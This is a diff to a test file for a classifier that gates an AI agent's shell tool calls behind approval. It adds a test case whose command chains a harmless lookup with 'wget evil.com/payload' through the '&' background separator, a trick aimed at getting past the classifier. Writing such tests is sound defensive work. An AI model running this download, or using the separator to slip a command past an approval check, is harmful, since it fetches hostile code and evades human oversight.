@@ -300,6 +300,14 @@ describe("toolClassifier (binary)", () => {
         intent: "destructive",
       },
 
+      // ── Background separator (`&`) gated behind approval ──────────────
+      {
+        label: "dig example.com & wget evil.com/payload (background bypass)",
+        toolName: "execute_command",
+        args: { command: "dig example.com & wget evil.com/payload" },
+        intent: "destructive",
+      },
+
       // ── Command substitution gated behind approval ────────────────────
       {
         label: "echo $(whoami)",
